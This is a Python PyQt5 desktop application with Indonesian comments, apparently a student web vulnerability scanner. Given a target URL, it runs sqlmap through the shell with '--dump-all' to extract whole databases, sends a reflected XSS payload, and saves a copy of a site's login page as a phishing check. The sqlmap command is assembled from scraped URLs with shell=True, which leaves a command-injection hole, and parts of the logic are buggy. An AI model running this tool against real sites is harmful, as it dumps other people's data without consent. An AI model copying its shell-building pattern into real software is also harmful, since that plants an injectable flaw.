import sys
import os
import subprocess
from bs4 import BeautifulSoup
import libs
from urllib.parse import *
import urllib.request       # library untuk HTTP request
import urllib.parse         # library untuk memberikan balasan kepada client
from urllib.error import *  # library untuk penanganan Error
import requests
import re
import http.client
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *
from time import *
from datetime import *
from webbrowser import open_new_tab
import os.path

class Aplikasi(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Aplikasi Penguji Celah Keamanan')  # Mengatur judul window
        self.interface()

    def interface(self):
        self.setGeometry(320, 50, 750, 650)  # Mengatur ukuran layar (posisi x, y, lebar, panjang)
        self.labelJudul = QLabel('Aplikasi Pengujian Celah Keamanan pada Aplikasi Berbasis Web', self)  # Membuat label
        self.label = QLabel('Masukkan URL / ip address target :',self)
        self.pemberitahuanSave = QLabel('Masukkan nama file dan destinasi folder untuk menyimpan log pengujian (Selain kata \'index\'):', self)
        self.url = QLineEdit(self)  # membuat input box
        self.attack_btn = QPushButton('Attack !', self)     # membuat button attack
        self.exit_btn = QPushButton('Exit', self)           # membuat button exit
        self.pemberitahuan = QLabel(self)
        self.NotifRentan = QLabel(self)
        self.destination_btn = QPushButton('Select Folder', self)
        self.namaFile = QLineEdit(self)
        self.dest = QLineEdit(self)

        # membuat text area
        self.textArea = QTextEdit(self)
        self.textArea.setText("")
        self.textArea.setDisabled(False)
        self.textArea.setGeometry(10, 320, 730, 320)


        self.url.setFixedWidth(350)  # mengatur ukuran lebar form
        self.namaFile.setFixedWidth(300)
        self.pemberitahuan.setText('(alamat website harus lengkap dengan http:// atau https://)')

        self.labelJudul.setGeometry(145, 10, 430, 16)  # Mengatur posisi x,y dan panjang lebar labelJudul
        self.label.setGeometry(10, 70, 211, 16)
        self.dest.move(430, 190)
        self.dest.setFixedWidth(300)
        self.dest.setDisabled(True)
        self.url.move(10, 100)
        self.namaFile.move(10,190)
        self.pemberitahuan.setGeometry(370, 105, 480, 16)
        self.pemberitahuanSave.setGeometry(10,160,550,16)
        self.NotifRentan.setGeometry(10, 180, 480, 16)
        self.attack_btn.move(400, 260)
        self.exit_btn.move(230, 260)
        self.destination_btn.move(320,190)
        self.show()

        # membuat tombol Attack ! disable ketika aplikasi pertama kali dijalankan
        self.attack_btn.setDisabled(True)

        self.url.textChanged.connect(self.disableButton)
        self.namaFile.textChanged.connect(self.disableButton)
        self.dest.textChanged.connect(self.disableButton)

        self.attack_btn.clicked.connect(self.btn_clk)
        self.exit_btn.clicked.connect(self.exit_clk)
        self.destination_btn.clicked.connect(self.dest_clk)

    def disableButton(self):                        # fungsi untuk disable button
        if len(self.url.text() and self.namaFile.text() and self.dest.text()) > 0:                # kalo ada string didalam line edit, maka...
            self.attack_btn.setDisabled(False)      # tombol attack tidak disable
        else:
            self.attack_btn.setDisabled(True)
    def exit_clk(self):
        sys.exit()

    def dest_clk(self):
        self.folderPath = QFileDialog.getExistingDirectory(self, 'Select Folder')
        self.dest.setText(self.folderPath)
        # self.filename = QFileDialog.getSaveFileName(self.folderPath)

    def btn_clk(self):
        self.textArea.clear()
        alamatURL = self.url.text()
        lokasiPath = self.dest.text()
        saveFileLog = os.path.join(lokasiPath, self.namaFile.text()+'.html')
        print(saveFileLog)
        try:
            redirect = requests.get(alamatURL, timeout=5)  # melakukan request terhadap URL
            URLAsli = redirect.url  # mengambil URL yang telah di-redirect / history
            Nomor = 1
            buatLog = open(saveFileLog, "w")
            buatLog.write("<html>\n"
                          "<head>\n<title>Report</title>\n"
                          "<style>\n"
                          "table, th, td {\n"
                          "border: 1px solid black;\n"
                          "border-collapse: collapse;\n"
                          "}\n"
                          "</style>\n"
                          "</head>\n"
                          "<body>\n"
                          "<h2 style=\"text-align:center;\"> Log Pengujian </h2>\n")
            print(URLAsli)
            self.textArea.insertPlainText("Alamat website : "+ URLAsli + '\n\n')
            buatLog.write("<h3> Alamat website : " + URLAsli + "</h3>\n\n")
            buatLog.write("<table style =\"width:100%;\">\n"
                          "<tr>\n"
                          "<th>No.</th>\n"
                          "<th>Tanggal Pengujian</th>\n"
                          "<th>Alamat Target</th>\n"
                          "<th>Keterangan</th>\n"
                          "</tr>\n")
            URLSql = []
            URLXss = []
            URLPhising = []
            srcPhising = []
            resultPhising = []

            response = urllib.request.urlopen(URLAsli).read()
            # print(response.read().decode('utf-8'))

            # --Proses serangan Phising--
            soupPhising = BeautifulSoup(response, 'html5lib')
            kondisiPhising = soupPhising.find_all('a', href=re.compile('login'))
            # print(kondisiPhising)
            if len(kondisiPhising) > 0:
                for b in kondisiPhising:
                    URLPhising.append(b['href'])
                print(URLPhising)
            else:
                print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli, "tidak rentan terhadap serangan Phising")
                self.textArea.insertPlainText(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " tidak rentan terhadap serangan Phising\n")
                # buatLog.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " tidak rentan terhadap serangan Phising\n")
                buatLog.write("<tr>\n")
                buatLog.write("<td>" + str(Nomor) + ". " + "</td>\n")
                buatLog.write("<td>" + datetime.now().strftime("%d-%m-%Y %H:%M:%S") + "</td>\n")
                buatLog.write("<td>" + "<a href=\'"+ URLAsli +"\'>" + URLAsli + "</td>\n")
                buatLog.write("<td>" + "Tidak rentan terhadap serangan Phising" + "</td>\n")
                buatLog.write("</tr>\n")
                Nomor = Nomor + 1
            intPhising = 0
            tdkPhising = []
            for phising in URLPhising:
                try:
                    responsePhising = urllib.request.urlopen(URLPhising[intPhising]).read()
                    soupCopasPhising = BeautifulSoup(responsePhising, 'html5lib')
                    kondisicekPhising = soupCopasPhising.find_all('img', {"src": True})
                    # print(kondisicekPhising)
                    if len(kondisicekPhising) > 0:
                        letter = ["http"]
                        x = 0
                        for c in kondisicekPhising:
                            srcPhising.append(c['src'])
                            first = srcPhising[x][:4]
                            if first in letter != -1 :
                                resultPhising.append("rentan")
                            else:
                                tdkPhising.append("a")
                            x = x + 1
                        print(srcPhising)
                        print(len(resultPhising))
                        print(len(tdkPhising))
                    if len(resultPhising) > 0:
                        kondisiCopasPhising = soupCopasPhising.find_all('html')
                        saveFileHTML = os.path.join(lokasiPath,'index.html')
                        filePhising = open(saveFileHTML, "w", encoding='utf-8')
                        filePhising.write(str(kondisiCopasPhising))
                        filePhising.close()

                        print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli,
                              "rentan terhadap serangan Phising")
                        self.textArea.insertPlainText(datetime.now().strftime(
                            "%d-%m-%Y %H:%M:%S") + " " + URLAsli + " rentan terhadap serangan Phising\n")
                        # buatLog.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " rentan terhadap serangan Phising\n")
                        buatLog.write("<tr>\n")
                        buatLog.write("<td>" + str(Nomor) + ". " + "</td>\n")
                        buatLog.write("<td>" + datetime.now().strftime("%d-%m-%Y %H:%M:%S") + "</td>\n")
                        buatLog.write("<td>" + "<a href=\'" + URLAsli + "\'>" + URLAsli + "</td>\n")
                        buatLog.write("<td>" + "Rentan terhadap serangan Phising" + "</td>\n")
                        buatLog.write("</tr>\n")
                        Nomor = Nomor + 1
                    else:
                        print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli,"tidak rentan terhadap serangan Phising !")
                        self.textArea.insertPlainText(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " tidak rentan terhadap serangan Phising\n")
                        # buatLog.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " +URLAsli + " tidak rentan terhadap serangan Phising\n")
                        buatLog.write("<tr>\n")
                        buatLog.write("<td>" + str(Nomor) + ". " + "</td>\n")
                        buatLog.write("<td>" + datetime.now().strftime("%d-%m-%Y %H:%M:%S") + "</td>\n")
                        buatLog.write("<td>" + "<a href=\'" + URLAsli + "\'>" + URLAsli + "</td>\n")
                        buatLog.write("<td>" + "Tidak rentan terhadap serangan Phising" + "</td>\n")
                        buatLog.write("</tr>\n")
                        Nomor = Nomor + 1
                    intPhising = intPhising + 1
                except (ValueError, URLError) as e:
                    print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli, "tidak rentan terhadap serangan Phising !")
            # -- Proses Serangan Phising end--

            soup = BeautifulSoup(response, 'html5lib')
            kondisi = soup.find_all('a', href=re.compile('id='))  # mencari tag <a> yang memiliki atribut "href". Kemudian mencari value href yang memiliki kalimat "id=" (Menggunakan regex / regular expression)
            # print(kondisi)

            if len(kondisi) > 0:
                y = urlparse(URLAsli)
                URLFix = y.scheme + "://" + y.netloc + y.path  # mengatur URL (menghilangkan query untuk case "atmaine.fi"
                print(URLFix)
                for a in kondisi:
                    URLSql.append(URLFix + a['href'])
                    URLXss.append(URLFix + a['href'])

            # --Proses serangan SQL Injection--
            intSQL = 0
            tdkSQL = []
            for sql in URLSql:
                try:
                    apa = []
                    command = ('sqlmap -u ' + URLSql[0] + ' --dbs' + ' --batch')
                    result = subprocess.Popen(command,stdout=subprocess.PIPE,shell=True)
                    tulis = open('file.txt', 'w')
                    tulis.write(str(result.stdout.read()))
                    tulis.close()
                    baca = open('file.txt', 'r')
                    cari = baca.read()
                    apa.append(cari.split("\\n[*]"))
                    nilai = 2
                    for db in apa:
                        print(db[nilai])
                        database = db[nilai]
                        commandDB = ('sqlmap -u ' + URLSql[0] + ' -D ' + database + ' --dump-all'+ ' --batch')
                        resultDB = subprocess.Popen(commandDB, stdout=subprocess.PIPE, shell=True)
                        tulisDB = open('fileDB.csv', 'w')
                        tulisDB.write(str(resultDB.stdout.read(25373)))
                        tulisDB.close()
                        nilai += 1
                    tdkSQL.append("a")
                    break
                except HTTPError as e:
                    print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLSql[intSQL], ":", e.code, e.reason)
                    intSQL = intSQL + 1
                except http.client.IncompleteRead as e:
                    responseSQL = e.partial
            if len(tdkSQL) == 0:
                print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli, "tidak rentan terhadap serangan SQL Injection")
                self.textArea.insertPlainText(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " tidak rentan terhadap serangan SQL Injection\n")

            # --Proses serangan SQL Injection end--

            # --Proses serangan XSS--
            intXSS = 0
            tdkXSS = []
            for xss in URLXss:
                try:
                    responseXSS = urllib.request.urlopen(URLXss[intXSS] + "%22%3E%3Cscript%3Ealert%28222%29%3C%2Fscript%3E").read()
                    soupXSS = BeautifulSoup(responseXSS, 'html5lib')
                    kondisiXSS = soupXSS.find_all('script', string=re.compile('alert'))
                    print(kondisiXSS)
                    if len(kondisiXSS) > 0:
                        print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLXss[intXSS] + " rentan terhadap serangan Cross-Site Scripting")
                        self.textArea.insertPlainText(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLXss[intXSS] + " rentan terhadap serangan Cross-Site Scripting\n")
                        buatLog.write("<tr>\n")
                        buatLog.write("<td>" + str(Nomor) + ". " + "</td>\n")
                        buatLog.write("<td>" + datetime.now().strftime("%d-%m-%Y %H:%M:%S") + "</td>\n")
                        buatLog.write("<td>" + "<a href=\'" + URLSql[intXSS] + "\'>" + URLSql[intXSS] + "</td>\n")
                        buatLog.write("<td>" + "Rentan terhadap serangan Cross-Site Scripting (XSS)" + "</td>\n")
                        buatLog.write("</tr>\n")
                        Nomor = Nomor + 1
                        tdkXSS.append("tidak")
                    intXSS = intXSS + 1
                except HTTPError as e:
                    print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLXss[intXSS], ":", e.code, e.reason)
                    intXSS = intXSS + 1
                except http.client.IncompleteRead as e:
                    responseSQL = e.partial
            if len(tdkXSS) == 0:
                print(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli, "tidak rentan terhadap serangan Cross-Site Scripting")
                self.textArea.insertPlainText(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " " + URLAsli + " tidak rentan terhadap serangan Cross-Site Scripting\n")
                buatLog.write("<tr>\n")
                buatLog.write("<td>" + str(Nomor) + ". " + "</td>\n")
                buatLog.write("<td>" + datetime.now().strftime("%d-%m-%Y %H:%M:%S") + "</td>\n")
                buatLog.write("<td>" + "<a href=\'" + URLAsli + "\'>" + URLAsli + "</td>\n")
                buatLog.write("<td>" + "Tidak rentan terhadap serangan Cross-Site Scripting (XSS)" + "</td>\n")
                buatLog.write("</tr>\n")
                buatLog.write("</table>\n"
                              "</body>\n"
                              "</html>\n")
                Nomor = Nomor + 1
                # Proses serangan XSS end--
            self.textArea.insertPlainText("Complete !!")
            buatLog.close()
        except HTTPError as e:
            # self.text.insertPlainText("Error code : " + e.code + e.reason)
            print("Error code :", e.code, e.reason)
        except URLError as e:
            print("Periksa koneksi internet anda : ", e.reason)
        #     self.text.insertPlainText("Periksa koneksi internet anda : " + e.reason)
        except ConnectionError as e:
            print("Error : ", e)
        #     self.text.insertPlainText("Error : " + e)
        except Exception as e:
            print("The site cannot be reached")



app = QApplication(sys.argv)
tampilan = Aplikasi()
sys.exit(app.exec_())
